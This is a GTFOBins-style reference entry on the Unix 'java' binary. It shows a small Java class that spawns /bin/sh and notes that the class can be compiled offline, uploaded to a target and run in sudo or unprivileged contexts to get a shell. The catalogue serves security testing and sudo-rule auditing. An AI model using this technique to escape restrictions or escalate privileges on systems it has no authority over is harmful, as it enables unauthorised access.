---
type: gtfobin
name: java
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# java

## shell

```bash
java Shell
```
_The `Shell.class` class file can be compiled offline, then uploaded to the target:

```
cat >Shell.java <<EOF
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();
    }
}
EOF

javac Shell.java
```_
**Contexts:** sudo, unprivileged
